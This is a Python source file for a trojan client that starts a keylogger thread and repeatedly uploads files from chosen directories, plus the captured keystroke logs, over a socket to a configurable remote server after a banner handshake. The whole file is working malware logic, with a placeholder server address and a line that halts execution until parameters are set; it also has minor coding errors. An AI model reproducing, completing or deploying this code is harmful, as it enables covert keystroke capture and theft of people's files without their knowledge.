import os
import sys
import socket
import platform
import time
import threading
import json
from config    import *
from common    import *
from netapi    import NetAPI
from path      import scan_dir
from keylogger import keylogger

### change server IP here ###
SERVER = '127.0.0.1'
PORT   = 1234
#############################

### change target directory here ###
raise NotImplementedError('Set parameters before execution. You can refer to the latest version in appendix')
trojan_dirs     = {}
keylogger_dirs  = {}
upload_dirs     = {}
max_size        = 16 * 1024 * 1024
max_file        = 0
update_interval = 60 * 60   # seconds
keylog_interval = 3
####################################

def send_dir(addr, port, start_dir, visited={}):
    if isinstance(start_dir, (list, tuple)):
        for d in start_dir:
            visited = send_dir(addr, port, d, visited)
        return visited
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect((addr, port, ))
    logging.debug('try to get banner')
    banner = b''
    while len(banner) < MAX_BANNER_LEN and banner[-1:] != b'\0':
        banner   += clientSocket.recv(MAX_BANNER_LEN - len(banner))
    logging.debug('get banner done')
    if banner[:4] == b'7RJN':
        logging.debug('banner correct')
        handler       = NetAPI(clientSocket)
        for filename in scan_dir(start_dir):
            filesize  = os.path.getsize(filename)
            filemtime = os.path.getmtime(filename)
            signature = [filesize, filemtime]
            if visited.get(filename) == signature:
                continue
            handler.send_file(filename)
            visited[filename] = signature
        handler.close()
    clientSocket.shutdown(socket.SHUT_WR)
    clientSocket.close()
    return visited

def send_dir_update(addr, port, start_dir, signature=None):
    visited = {}
    if isinstance(signature, str) and os.path.exists(signature):
        with open(signature) as fp:
            visited = json.load(fp)
    visited = send_dir(addr, port, start_dir, visited=visited)
    if isinstance(signature, str):
        dirname = os.path.dirname(signature)
        if not os.path.exists(dirname):
            os.makedirs(dirname)
        with open(signature, 'w') as fp:
            json.dump(visited, fp)
    return visited

def send_file_thread(addr, port, logs, signature=None):
    last_send = 0.0
    while True:
        curtime          = time.time()
        if curtime - last_send < update_interval:
            continue
        last_send        = curtime
        args   = (addr, port, start_dirs,)
        kwargs = {'signature': signature, }
        thread  = threading.Thread(target=send_dir_update, args=args, kwargs=kwargs, )
        thread.start()
        threads.append(thread)
        time.sleep(1)

def send_log_thread(addr, port, logs, signature=None):
    while True:
        send_dir(addr, port, logs, signature=signature)
        time.sleep(keylog_interval)

if __name__ == '__main__':
    threads          = []
    trojan_dir       = trojan_dirs.get(platform.system(), [])
    start_dirs       = upload_dirs.get(platform.system(), [])
    keylogdir        = keylogger_dirs.get(platform.system())
    signature        = None
    keylogsignature  = None
    if isinstance(trojan_dir, str):
        if not os.path.exists(trojan_dir):
            os.makedirs(trojan_dir)
        signature       = os.path.join(trojan_dir, 'Signature.json')
        keylogsignature = os.path.join(trojan_dir, 'KeyLogger.json')
    if keylogdir:
        thread  = threading.Thread(target=keylogger, args=(keylogdir, False,))
        thread.start()
        threads.append(thread)
        args   = (SERVER, PORT, keylogdir, )
        kwargs = {'signature': keylogsignature}
        thread = threading.Thread(target=send_log_thread, args=args, kwargs=kwargs)
        thread.start()
        threads.append(thread)
    if start_dirs:
        args   = (SERVER, PORT, start_dirs, )
        kwargs = {'signature': signature}
        thread = threading.Thread(target=send_file_thread, args=args, kwargs=kwargs)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
